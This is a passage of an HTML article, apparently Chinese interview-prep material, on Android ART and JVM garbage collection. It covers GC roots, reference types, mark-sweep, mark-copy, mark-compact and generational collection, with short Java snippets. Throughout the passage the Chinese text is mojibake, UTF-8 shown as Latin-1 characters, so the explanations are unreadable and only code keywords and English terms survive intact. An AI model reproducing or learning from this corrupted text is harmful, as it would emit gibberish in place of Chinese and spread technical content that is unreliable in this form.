<p><strong>JVMçš„GCç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>å¤šç§æ”¶é›†å™¨å¯é€‰</strong>ï¼šSerialã€Parallelã€CMSã€G1ã€ZGCã€Shenandoahç­‰</li>
<li><strong>éœ€è¦å¼€å‘è€…é€‰æ‹©</strong>ï¼šæ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©åˆé€‚çš„æ”¶é›†å™¨</li>
<li><strong>å¤šç§ä¼˜åŒ–æ–¹å‘</strong>ï¼šååé‡ä¼˜å…ˆã€å»¶è¿Ÿä¼˜å…ˆã€å†…å­˜å ç”¨ä¼˜å…ˆç­‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆARTåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼Ÿ</strong></p>
<ul>
<li>é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–ï¼ˆä½å»¶è¿Ÿã€äº¤äº’å¼åº”ç”¨ï¼‰</li>
<li>ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©ï¼Œç®€åŒ–å¼€å‘</li>
<li>ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>4. å¦‚ä½•åˆ¤æ–­å¯¹è±¡å·²æ­»ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Androidä½¿ç”¨<strong>å¯è¾¾æ€§åˆ†æç®—æ³•</strong>æ¥åˆ¤æ–­å¯¹è±¡æ˜¯å¦å·²æ­»ã€‚</p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<ol>
<li>ä»ä¸€ç»„ç§°ä¸º"GC Roots"çš„å¯¹è±¡å¼€å§‹</li>
<li>å‘ä¸‹æœç´¢ï¼Œæ ‡è®°æ‰€æœ‰èƒ½å¤Ÿä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡ï¼ˆå­˜æ´»å¯¹è±¡ï¼‰</li>
<li>æ— æ³•ä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡å°±æ˜¯"åƒåœ¾"ï¼Œå¯ä»¥è¢«å›æ”¶</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆä¸ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•ï¼Ÿ</strong></p>
<ul>
<li>å¼•ç”¨è®¡æ•°ç®—æ³•æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</li>
<li>ä¸¤ä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨æ—¶ï¼Œå¼•ç”¨è®¡æ•°æ°¸è¿œä¸ä¸º0ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</li>
<li>å¯è¾¾æ€§åˆ†æç®—æ³•å¯ä»¥å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œå‡†ç¡®åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯å›æ”¶</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯è¾¾æ€§åˆ†æå¯ä»¥å¤„ç†å¾ªç¯å¼•ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    Node next;
}

<span class="hljs-type">Node</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
<span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
node1.next = node2;
node2.next = node1;  <span class="hljs-comment">// å¾ªç¯å¼•ç”¨</span>

<span class="hljs-comment">// å¦‚æœnode1å’Œnode2éƒ½ä¸å†è¢«GC Rootså¼•ç”¨</span>
<span class="hljs-comment">// å³ä½¿å®ƒä»¬ç›¸äº’å¼•ç”¨ï¼Œä¹Ÿæ— æ³•ä»GC Rootsåˆ°è¾¾</span>
<span class="hljs-comment">// æ‰€ä»¥å®ƒä»¬éƒ½æ˜¯åƒåœ¾ï¼Œå¯ä»¥è¢«å›æ”¶</span>
</code></pre>
<p><strong>5. GC Rootså¯¹è±¡æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>GC Rootsæ˜¯å¯è¾¾æ€§åˆ†æç®—æ³•çš„èµ·ç‚¹ï¼Œä»¥ä¸‹å¯¹è±¡å¯ä»¥ä½œä¸ºGC Rootsï¼š</p>
<ol>
<li>
<p><strong>è™šæ‹Ÿæœºæ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°</li>
<li>ç¤ºä¾‹ï¼šæ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡å¼•ç”¨çš„å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>æ–¹æ³•åŒºä¸­é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>staticå˜é‡</li>
<li>ç¤ºä¾‹ï¼šç±»çš„é™æ€å˜é‡</li>
</ul>
</li>
<li>
<p><strong>æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>å¸¸é‡</li>
<li>ç¤ºä¾‹ï¼šå­—ç¬¦ä¸²å¸¸é‡</li>
</ul>
</li>
<li>
<p><strong>æœ¬åœ°æ–¹æ³•æ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</strong></p>
<ul>
<li>Nativeæ–¹æ³•ä¸­çš„å¼•ç”¨</li>
<li>ç¤ºä¾‹ï¼šJNIè°ƒç”¨ä¸­çš„å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>åŒæ­¥é”æŒæœ‰çš„å¯¹è±¡</strong></p>
<ul>
<li>synchronizedæŒæœ‰çš„å¯¹è±¡</li>
<li>ç¤ºä¾‹ï¼šé”å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>å†…éƒ¨å¼•ç”¨</strong></p>
<ul>
<li>Classå¯¹è±¡ã€å¼‚å¸¸å¯¹è±¡ç­‰</li>
<li>ç¤ºä¾‹ï¼šç±»çš„Classå¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆè¿™äº›æ˜¯GC Rootsï¼Ÿ</strong></p>
<ul>
<li>è¿™äº›å¯¹è±¡æ˜¯ç¨‹åºè¿è¡Œçš„åŸºç¡€ï¼Œä¸èƒ½è¢«å›æ”¶</li>
<li>ä»è¿™äº›å¯¹è±¡å¼€å§‹ï¼Œå¯ä»¥æ‰¾åˆ°æ‰€æœ‰æ­£åœ¨ä½¿ç”¨çš„å¯¹è±¡</li>
<li>æ— æ³•ä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡ï¼Œè¯´æ˜ç¨‹åºä¸å†ä½¿ç”¨ï¼Œå¯ä»¥å›æ”¶</li>
</ul>
<p><strong>6. å¼•ç”¨ç±»å‹æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Javaä¸­æœ‰å››ç§å¼•ç”¨ç±»å‹ï¼Œå¼ºåº¦ä»å¼ºåˆ°å¼±ï¼š</p>
<p><strong>1. å¼ºå¼•ç”¨ï¼ˆStrong Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæœ€å¸¸è§çš„å¼•ç”¨ç±»å‹ï¼Œåªè¦å¼ºå¼•ç”¨å­˜åœ¨ï¼Œå¯¹è±¡å°±ä¸ä¼šè¢«GCå›æ”¶</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šæ™®é€šå¯¹è±¡å¼•ç”¨ã€Activityå¼•ç”¨ç­‰</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼ºå¼•ç”¨</span>
<span class="hljs-comment">// objå¼•ç”¨çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ï¼Œé™¤éobj = null</span>
</code></pre>
<p><strong>2. è½¯å¼•ç”¨ï¼ˆSoft Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå†…å­˜ä¸è¶³æ—¶æ‰å›æ”¶ï¼Œé€‚åˆç¼“å­˜åœºæ™¯</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šAndroidä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè®¾å¤‡å†…å­˜æœ‰é™ï¼Œè½¯å¼•ç”¨å¯èƒ½å¾ˆå¿«è¢«å›æ”¶</li>
<li><strong>å»ºè®®</strong>ï¼šä½¿ç”¨LruCacheç­‰æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java">SoftReference&lt;Bitmap&gt; softRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;&gt;(bitmap);
<span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> softRef.get();  <span class="hljs-comment">// å¯èƒ½è¿”å›nullï¼ˆå¦‚æœè¢«å›æ”¶äº†ï¼‰</span>
</code></pre>
<p><strong>3. å¼±å¼•ç”¨ï¼ˆWeak Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåªè¦GCå°±ä¼šå›æ”¶ï¼Œä¸ä¼šé˜»æ­¢å¯¹è±¡è¢«å›æ”¶</li>
<li><strong>Androidä½¿ç”¨åœºæ™¯</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ï¼ˆHandlerã€é™æ€å˜é‡æŒæœ‰å¯¹è±¡æ—¶ï¼‰</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é¿å…Handlerå†…å­˜æ³„æ¼</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
}
</code></pre>
<p><strong>4. è™šå¼•ç”¨ï¼ˆPhantom Referenceï¼‰</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæœ€å¼±çš„å¼•ç”¨ç±»å‹ï¼Œä¸»è¦ç”¨äºå¯¹è±¡å›æ”¶å‰çš„æ¸…ç†å·¥ä½œ</li>
<li><strong>Androidä½¿ç”¨åœºæ™¯</strong>ï¼šå¾ˆå°‘ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºç‰¹æ®Šåœºæ™¯</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ— æ³•é€šè¿‡è™šå¼•ç”¨è·å–å¯¹è±¡</li>
</ul>
<p><strong>å¼•ç”¨å¼ºåº¦å¯¹æ¯”ï¼š</strong>
å¼ºå¼•ç”¨ &gt; è½¯å¼•ç”¨ &gt; å¼±å¼•ç”¨ &gt; è™šå¼•ç”¨</p>
<h4 data-id="heading-77">6.1.2 åƒåœ¾å›æ”¶ç®—æ³•</h4>
<p><strong>1. åƒåœ¾å›æ”¶ç®—æ³•æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>åƒåœ¾å›æ”¶ç®—æ³•ä¸»è¦æœ‰å››ç§ï¼š</p>
<p><strong>1. æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark-Sweepï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šå…ˆæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œç„¶åæ¸…é™¤</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šä¸ä¸»è¦ä½¿ç”¨</li>
</ul>
<p><strong>2. æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆMark-Copyï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šå°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œå›æ”¶æ—¶å°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ²¡æœ‰å†…å­˜ç¢ç‰‡ï¼Œä½†æµªè´¹å†…å­˜</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼š<strong>ä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</strong>ï¼Œé€‚åˆå¹´è½»ä»£</li>
</ul>
<p><strong>3. æ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆMark-Compactï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šæ ‡è®°åï¼Œå°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åæ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæ²¡æœ‰å†…å­˜ç¢ç‰‡ä¸”ä¸æµªè´¹å†…å­˜ï¼Œä½†æ•ˆç‡è¾ƒä½</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šåœ¨æŸäº›åœºæ™¯ä½¿ç”¨ï¼Œç”¨äºè€å¹´ä»£</li>
</ul>
<p><strong>4. åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆGenerational Collectionï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šæ ¹æ®å¯¹è±¡ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºå¹´è½»ä»£å’Œè€å¹´ä»£ï¼Œä¸åŒä»£ç”¨ä¸åŒç®—æ³•</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šç»“åˆå¤šç§ç®—æ³•çš„ä¼˜ç‚¹</li>
<li><strong>Androidä½¿ç”¨</strong>ï¼šä½¿ç”¨è¿™ä¸ªç­–ç•¥</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆAndroidä¸»è¦ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼Ÿ</strong></p>
<ul>
<li>é€‚åˆå¹´è½»ä»£ï¼šå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå­˜æ´»å¯¹è±¡å°‘ï¼Œå¤åˆ¶æˆæœ¬ä½</li>
<li>æ²¡æœ‰å†…å­˜ç¢ç‰‡ï¼šå¤åˆ¶åå†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜</li>
<li>é€šè¿‡ä¼˜åŒ–ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼Œåªæµªè´¹10%çš„å†…å­˜ï¼Œè€Œä¸æ˜¯50%</li>
</ul>
<p><strong>2. æ ‡è®°-æ¸…é™¤ç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong>
åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šä»GC Rootså¼€å§‹ï¼Œæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…é™¤æ‰€æœ‰è¢«æ ‡è®°çš„å¯¹è±¡</li>
</ol>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°ç®€å•</li>
<li>ä¸éœ€è¦ç§»åŠ¨å¯¹è±¡</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>äº§ç”Ÿå†…å­˜ç¢ç‰‡</strong>ï¼šæ¸…é™¤åç•™ä¸‹ä¸è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œå½±å“åç»­å†…å­˜åˆ†é…æ•ˆç‡</li>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ä¸¤æ¬¡éå†ï¼ˆæ ‡è®°å’Œæ¸…é™¤ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidä¸ä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</li>
<li>å› ä¸ºä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡ï¼Œå½±å“åç»­å†…å­˜åˆ†é…æ•ˆç‡</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ ‡è®°å‰ï¼š<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[å¯¹è±¡4]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
        å­˜æ´»   åƒåœ¾   å­˜æ´»   åƒåœ¾   å­˜æ´»

æ¸…é™¤åï¼š<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
        ç¢ç‰‡å¤šï¼Œåˆ†é…æ•ˆç‡ä½
</code></pre>
<p><strong>3. æ ‡è®°-å¤åˆ¶ç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong>
å°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨ä¸€å—ã€‚å›æ”¶æ—¶ï¼Œå°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ï¼Œç„¶åæ¸…ç©ºå½“å‰å—ã€‚</p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šå¤åˆ¶åå†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜</li>
<li><strong>å›æ”¶æ•ˆç‡é«˜</strong>ï¼šåªéœ€è¦å¤åˆ¶å­˜æ´»å¯¹è±¡ï¼Œå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå¤åˆ¶æˆæœ¬ä½</li>
<li><strong>é€‚åˆå¹´è½»ä»£</strong>ï¼šå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå­˜æ´»å¯¹è±¡å°‘</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æµªè´¹å†…å­˜ï¼šéœ€è¦ä¸¤å—å†…å­˜ï¼Œä½†åªä½¿ç”¨ä¸€å—</li>
<li>å¯¹è±¡å­˜æ´»ç‡é«˜æ—¶æ•ˆç‡ä½ï¼šéœ€è¦å¤åˆ¶å¾ˆå¤šå¯¹è±¡</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li><strong>Android ARTä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</strong></li>
<li>é€‚åˆå¹´è½»ä»£å›æ”¶ï¼ˆå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼‰</li>
<li>é€šè¿‡ä¼˜åŒ–ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼Œåªæµªè´¹10%çš„å†…å­˜ï¼ˆè€Œä¸æ˜¯50%ï¼‰</li>
</ul>
<p><strong>æ”¹è¿›ç®—æ³•ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼š</strong></p>
<ul>
<li>å°†å†…å­˜åˆ†ä¸ºEdenåŒºå’Œä¸¤ä¸ªSurvivoråŒº</li>
<li>é»˜è®¤æ¯”ä¾‹ï¼šEden : Survivor0 : Survivor1 = 8 : 1 : 1</li>
<li>åªæµªè´¹10%çš„å†…å­˜ï¼Œè€Œä¸æ˜¯50%</li>
</ul>
<p><strong>4. æ ‡è®°-æ•´ç†ç®—æ³•çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong>
åˆ†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ•´ç†é˜¶æ®µ</strong>ï¼šå°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
</ol>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šæ•´ç†åå†…å­˜è¿ç»­</li>
<li><strong>ä¸æµªè´¹å†…å­˜</strong>ï¼šä¸éœ€è¦ä¸¤å—å†…å­˜</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
<li>é€‚åˆè€å¹´ä»£ï¼šå¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidåœ¨æŸäº›åœºæ™¯ä¸‹ä½¿ç”¨</li>
<li>ä¸»è¦ç”¨äºè€å¹´ä»£å›æ”¶ï¼ˆé¿å…å†…å­˜ç¢ç‰‡ï¼‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆè€å¹´ä»£ç”¨æ ‡è®°-æ•´ç†ï¼Ÿ</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
<li>é¿å…å†…å­˜ç¢ç‰‡ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
<li>ä¸æµªè´¹å†…å­˜ï¼ˆä¸åƒæ ‡è®°-å¤åˆ¶éœ€è¦ä¸¤å—å†…å­˜ï¼‰</li>
</ul>
<p><strong>5. åˆ†ä»£æ”¶é›†ç®—æ³•çš„åŸç†ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ç†è®ºåŸºç¡€ï¼š</strong>
æ ¹æ®å¯¹è±¡ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œå°†å†…å­˜åˆ†ä¸ºä¸åŒçš„ä»£ï¼š</p>
<ul>
<li><strong>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­</strong>ï¼šåˆ›å»ºåå¾ˆå¿«è¢«å›æ”¶</li>
<li><strong>å°‘æ•°å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆé•¿</strong>ï¼šé•¿æœŸå­˜æ´»</li>
</ul>
<p><strong>åˆ†ä»£ç­–ç•¥ï¼š</strong></p>
<p><strong>å¹´è½»ä»£ï¼ˆYoung Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸçŸ­</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆå¿«é€Ÿé«˜æ•ˆï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šé«˜ï¼ˆé¢‘ç¹å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šPartial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šçŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>è€å¹´ä»£ï¼ˆOld Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆé¿å…ç¢ç‰‡ï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šä½ï¼ˆå¶å°”å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šFull GCï¼ˆå®Œå…¨å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šé•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„åˆ†ä»£æ”¶é›†ï¼š</strong></p>
<ol>
<li><strong>å¹´è½»ä»£ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•</strong>ï¼šå¿«é€Ÿå›æ”¶ï¼Œé€‚åˆé¢‘ç¹å›æ”¶</li>
<li><strong>è€å¹´ä»£ç”¨æ ‡è®°-æ•´ç†ç®—æ³•</strong>ï¼šé¿å…å†…å­˜ç¢ç‰‡</li>
<li><strong>è¿™æ ·è®¾è®¡çš„å¥½å¤„</strong>ï¼šæé«˜GCæ•ˆç‡ï¼Œå‡å°‘GCæš‚åœæ—¶é—´ï¼Œå‡å°‘å†…å­˜ç¢ç‰‡</li>
</ol>
<p><strong>å¯¹è±¡æ™‹å‡è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡ â†’ å¹´è½»ä»£ï¼ˆEdenåŒºï¼‰
<span class="hljs-bullet">2.</span> å¹´è½»ä»£GC â†’ å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
<span class="hljs-bullet">3.</span> å¤šæ¬¡GCåä»å­˜æ´» â†’ æ™‹å‡åˆ°è€å¹´ä»£
<span class="hljs-bullet">4.</span> è€å¹´ä»£GC â†’ å›æ”¶é•¿æœŸå­˜æ´»çš„å¯¹è±¡
</code></pre>
<h4 data-id="heading-78">6.1.3 Android GCåŸºç¡€</h4>
<p><strong>1. Androidä½¿ç”¨çš„åƒåœ¾å›æ”¶å™¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Androidä½¿ç”¨çš„åƒåœ¾å›æ”¶å™¨æ˜¯<strong>å¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼Œç®€ç§°CCï¼‰</strong>ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åªæœ‰ä¸€ä¸ªæ”¶é›†å™¨</strong>ï¼šAndroidåªæœ‰è¿™ä¸€ç§æ”¶é›†å™¨</li>
<li><strong>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</strong>ï¼šå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨è¿™ä¸ªæ”¶é›†å™¨</li>
<li><strong>æ²¡æœ‰å¤šç§å¯é€‰</strong>ï¼šä¸åƒJVMæœ‰Serialã€Parallelã€CMSã€G1ã€ZGCç­‰å¤šç§å¯é€‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªï¼Ÿ</strong></p>
<ul>
<li>é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–ï¼šä½å»¶è¿Ÿã€äº¤äº’å¼åº”ç”¨</li>
<li>ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©ï¼šç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</li>
<li>ç®€åŒ–å¼€å‘ï¼šå¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«</li>
</ul>
<p><strong>æ”¶é›†å™¨çš„ç‰¹æ€§ï¼š</strong></p>
<ul>
<li>åˆ†ä»£å›æ”¶ï¼šå¹´è½»ä»£å’Œè€å¹´ä»£</li>
